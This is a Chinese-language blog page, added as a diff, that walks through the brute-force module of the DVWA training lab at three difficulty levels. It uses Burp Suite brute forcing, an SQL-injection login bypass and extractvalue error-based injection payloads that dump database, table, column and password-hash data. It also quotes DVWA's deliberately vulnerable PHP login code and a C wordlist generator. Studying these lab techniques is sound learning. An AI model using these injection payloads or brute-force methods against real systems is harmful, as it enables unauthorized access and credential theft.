@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="DVWA Brute ForceLOWWAY 1这是一道密码爆破的题目，我们可以利用burp suite来进行爆破。由于不知道用户名和密码的情况下给Username和Password同时设置变量，进行Cluster bomb模式即可。找到不一样的长度就可以了。user:adminpassword:password WAY 2这道题我们也可以尝试利用sql注入的方法来绕过口令输入 1?id &amp;#x3">
+<meta property="og:type" content="website">
+<meta property="og:title" content="dvwa-brute">
+<meta property="og:url" content="http://example.com/dvwa-brute/dvwa-brute.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="DVWA Brute ForceLOWWAY 1这是一道密码爆破的题目，我们可以利用burp suite来进行爆破。由于不知道用户名和密码的情况下给Username和Password同时设置变量，进行Cluster bomb模式即可。找到不一样的长度就可以了。user:adminpassword:password WAY 2这道题我们也可以尝试利用sql注入的方法来绕过口令输入 1?id &amp;#x3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/1.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/2.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/3.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/4.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/5.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/7.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/6.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/8.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/9.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/10.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/11.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/12.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/13.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/14.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/15.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/16.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/17.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/18.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/19.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/24.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/19.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/20.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/21.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/22.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/19.png">
+<meta property="og:image" content="http://example.com/dvwa-brute/dvwa-brute/23.png">
+<meta property="article:published_time" content="2021-01-17T05:19:16.000Z">
+<meta property="article:modified_time" content="2021-01-22T06:46:25.539Z">
+<meta property="article:author" content="ziyuexi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/dvwa-brute/dvwa-brute/1.png">
+
+<link rel="canonical" href="http://example.com/dvwa-brute/dvwa-brute">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>dvwa-brute | blog
+</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+  
+  
+
+          <div class="content page posts-expand">
+            
+
+    
+    
+    
+    <div class="post-block" lang="zh-CN">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">dvwa-brute
+</h1>
+
+<div class="post-meta">
+  
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+          <h1 id="DVWA-Brute-Force"><a href="#DVWA-Brute-Force" class="headerlink" title="DVWA Brute Force"></a>DVWA Brute Force</h1><h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><h3 id="WAY-1"><a href="#WAY-1" class="headerlink" title="WAY 1"></a>WAY 1</h3><p><img src="/dvwa-brute/dvwa-brute/1.png" alt="tcp"><br>这是一道密码爆破的题目，我们可以利用<strong>burp suite</strong>来进行爆破。<br><img src="/dvwa-brute/dvwa-brute/2.png" alt="tcp"><br>由于不知道用户名和密码的情况下给<strong>Username</strong>和<strong>Password</strong>同时设置变量，进行<strong>Cluster bomb</strong>模式即可。<br><img src="/dvwa-brute/dvwa-brute/3.png" alt="tcp"><br>找到不一样的长度就可以了。<br>user:admin<br>password:password</p>
+<h3 id="WAY-2"><a href="#WAY-2" class="headerlink" title="WAY 2"></a>WAY 2</h3><p>这道题我们也可以尝试利用<strong>sql注入</strong>的方法来绕过口令<br><img src="/dvwa-brute/dvwa-brute/4.png" alt="tcp"><br>输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id &#x3D; &#39;1</span><br></pre></td></tr></table></figure>
+<p>来进行检测看看是否能进行sql注入<br><img src="/dvwa-brute/dvwa-brute/5.png" alt="tcp"><br>我们得到了如下回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1&#39; AND password &#x3D; &#39;d41d8cd98f00b204e9800998ecf8427e&#39;&#39; at line 1</span><br></pre></td></tr></table></figure>
+<p>我们可以得到如下信息首先是数据库应用的<strong>MYSQL数据库</strong>其次我们得到了一份SQL的格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;1&#39; AND password &#x3D; &#39;d41d8cd98f00b204e9800998ecf8427e&#39;&#39;</span><br></pre></td></tr></table></figure>
+<p>如何得到我们要输入的SQL注入语句的正确格式、<br>将上句话左右两边<strong>单引号</strong>去掉</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; AND password &#x3D; &#39;d41d8cd98f00b204e9800998ecf8427e&#39;</span><br></pre></td></tr></table></figure>
+<p>就是我们的正确输入格式我们可以根据<strong>password</strong>推测出后面为<strong>密码</strong>前面则为<strong>用户名</strong><br>现在我们可以开始使用sql命令来进行绕过<br>例如使用or运算符，or运算符可以进行一个逻辑上的绕过，左右有一个为真那么整体为真所以我们仅仅需要知道用户名就可以了<br>命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#39; or &#39;&#39; AND password &#x3D; &#39;</span><br></pre></td></tr></table></figure>
+<p>那么username我们如何去获得呢？<br>这里有三种方法</p>
+<h4 id="WAY-2-1"><a href="#WAY-2-1" class="headerlink" title="WAY 2-1"></a>WAY 2-1</h4><p>去猜这个用户名<br>我们所熟知的网站以及系统的管理员用户名基本上是</p>
+<ol>
+<li>**root:**linux超级权限</li>
+<li>**system32:**windows管理员</li>
+<li>**admin:**一些网站后台的管理员</li>
+<li><strong>administrator:**windows超级权限<br>然后我们可以尝试下</strong>admin**<h4 id="WAY-2-2"><a href="#WAY-2-2" class="headerlink" title="WAY 2-2"></a>WAY 2-2</h4>再次使用<strong>burp suite</strong>进行爆破<br><img src="/dvwa-brute/dvwa-brute/7.png" alt="tcp"><br>仅仅给username添加变量，这样可以极大减少我们电脑的工作量毕竟同时爆破两组变量是很费时间的。<br><img src="/dvwa-brute/dvwa-brute/6.png" alt="tcp"><br>最终得到admin为我们的用户名。<h4 id="WAY-2-3"><a href="#WAY-2-3" class="headerlink" title="WAY 2-3"></a>WAY 2-3</h4>使用sql注入报错法来爆破出用户名甚至是密码<br>使用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue</span><br></pre></td></tr></table></figure>
+函数来进行表格查询<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and extractvalue(&#39;helloworld&#39;,concat(&#39;!&#39;,(select database()),&#39;!&#39;))#</span><br></pre></td></tr></table></figure>
+那么现在有必要解释下<strong>extractvalue</strong>函数用法<br>extractvalue(<strong>目标名字</strong>,<strong>路径</strong>)<br>第二个参数 路径是我们可以进行操作的变量而目标名字很明显没有库或表的名字会叫helloworld这是我们故意让它出错，来让mysql报错。</li>
+</ol>
+<p><strong>concat</strong>的目的是将我们添加的两个字符!与中间数据库的名字进行连接来达到报错效果。<br>**select database()**的目的是显示目前使用的数据库的名字<br><img src="/dvwa-brute/dvwa-brute/8.png" alt="tcp"><br>我们看到得到的回显是我们正在使用dvwa数据库<br>接着我们要爆破出数据库下的表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and extractvalue(&#39;helloworld&#39;,concat(&#39;!&#39;,(select concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;limit 0-无穷,1-无穷),&#39;?&#39;))#</span><br></pre></td></tr></table></figure>
+<p>由于我们只能回显出一个名字所以需要我们不断修改limit后面的数并使之相差不超过1来达到爆破出所有表的目的<br><img src="/dvwa-brute/dvwa-brute/9.png" alt="tcp"><br><img src="/dvwa-brute/dvwa-brute/10.png" alt="tcp"><br>很明显users的表对我们很有用<br>我们继续来爆破列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and extractvalue(&#39;helloworld&#39;,concat(&#39;*&#39;,(select concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;limit 0-无穷,1-无穷),&#39;*&#39;))#</span><br></pre></td></tr></table></figure>
+<p>通过修改limit后的数字我们可以爆破出所有列名<br><img src="/dvwa-brute/dvwa-brute/11.png" alt="tcp"><br>其中我们感兴趣的肯定是user和password<br>我们在一次爆破出user和password</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and extractvalue(&#39;helloworld&#39;,concat(&#39;!&#39;,(select concat(user) from dvwa.users limit 0,1),&#39;?&#39;))#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and extractvalue(&#39;helloworld&#39;,concat(&#39;!&#39;,(select concat(password) from dvwa.users limit 0,1),&#39;?&#39;))#</span><br></pre></td></tr></table></figure>
+<p><img src="/dvwa-brute/dvwa-brute/12.png" alt="tcp"><br><img src="/dvwa-brute/dvwa-brute/13.png" alt="tcp"><br>我们得到了admin的用户名输入即可</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysql_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$avatar</span> = mysql_result( <span class="variable">$result</span>, <span class="number">0</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>这个是这道题的源代码<br>仅仅是一个简单的获取用户输入的用户名密码再到数据库中去匹配查询没有任何安全措施可言,给了我们极大的操作空间。<br>我们刚才从数据库里面爆破出的密码是：5f4dcc3b5aa765d61d8327deb882cf和我们真正的密码password对不上号，原因在这里</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br></pre></td></tr></table></figure>
+<p>应用了md5进行加密，我们可以找个解密器解一下就知道了<br><img src="/dvwa-brute/dvwa-brute/14.png" alt="tcp"></p>
+<hr>
+
+<h2 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h2><p>我们上来先看看能否正常进行sql注入<br><img src="/dvwa-brute/dvwa-brute/15.png" alt="tcp"><br>然并卵，所以我们只能进行burn suite进行爆破和low难度一样<br>最后得到账号和密码</p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>我们先来看看medium级别的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = mysql_real_escape_string( <span class="variable">$user</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = mysql_real_escape_string( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysql_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$avatar</span> = mysql_result( <span class="variable">$result</span>, <span class="number">0</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>可以看到在sql注入方面使用了mysql_real_escape_string函数<br>这个函数的作用就是在于过滤掉我们使用sql注入时所用到的一些字符<br>x00<br>n<br>r<br>‘<br>“<br>x1a<br>使得我们不能直接进行sql注入<br>然后就是在每次密码错误登录失败的情况下都会调用sleep()函数来达到延缓爆破的目的使得我们爆破时间变长，但也仅仅是变长并没有解决实际问题。</p>
+<hr>
+
+<h2 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h2><p><img src="/dvwa-brute/dvwa-brute/16.png" alt="tcp"><br>我们现在来写high级别的题目，首先我们先抓包看看。<br><img src="/dvwa-brute/dvwa-brute/17.png" alt="tcp"><br>我们可以发现多了个在给服务器发包的时候多了和user_token的内容，我们可以对比下服务器给我们的响应内容<br><img src="/dvwa-brute/dvwa-brute/18.png" alt="tcp"><br>可以看到我们发包收包都会有个user_token，这个就好比我这一次登陆时的一个身份证，这就像发包的user_token就是身份证号码，账户名密码就是我们的长相，学校通过身份证和长相来判断我们是不是学生，从而发给我们学生证，就是响应的user_token，只有将发包的和响应的user_token一一对应才能让我们进入学校。<br><img src="/dvwa-brute/dvwa-brute/19.png" alt="tcp"><br>OK，我们先在来进行爆破，首先分别在username,password,user_token后的值设置变量并调到pitchfork模式，pitchfork模式的原理是加入我有p1:1,3;p2:2,4两个数组那么在对两个变量进行爆破是我的组合就有两次为1 2;3 4。因为我们要保证每次user_token的值不一样所以无法使用bomb模式，但是我们要如何保证全面爆破出用户名和密码的所有组合呢，我们可以写一个C语言程序帮助我们生成出这样的一份字典。<br>代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN sizeof(struct node)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">char</span> password[<span class="number">20</span>];</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fpRead=fopen(<span class="string">&quot;/RT/C-Project/top100.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    FILE *fpwrite=fopen(<span class="string">&quot;top100(1).txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">head</span>,*<span class="title">p1</span>,*<span class="title">p2</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    p1 = p2 = (struct node *)<span class="built_in">malloc</span>(LEN);</span><br><span class="line">    head = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>;i &lt;= n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(fpRead,<span class="string">&quot;%s&quot;</span>,&amp;p1 -&gt; password);</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            head = p1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p2 -&gt; next = p1;</span><br><span class="line">        &#125;</span><br><span class="line">        p2 = p1;</span><br><span class="line">        p1 = (struct node *)<span class="built_in">malloc</span>(LEN);</span><br><span class="line">    &#125;</span><br><span class="line">    p2 -&gt; next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span>(p1 = head;p1!=<span class="literal">NULL</span>;p1 = p1 -&gt; next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(p2 = head;p2 != <span class="literal">NULL</span>;p2 = p2 -&gt; next)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(fpwrite,<span class="string">&quot;%s\n&quot;</span>,p1 -&gt; password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;finish!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
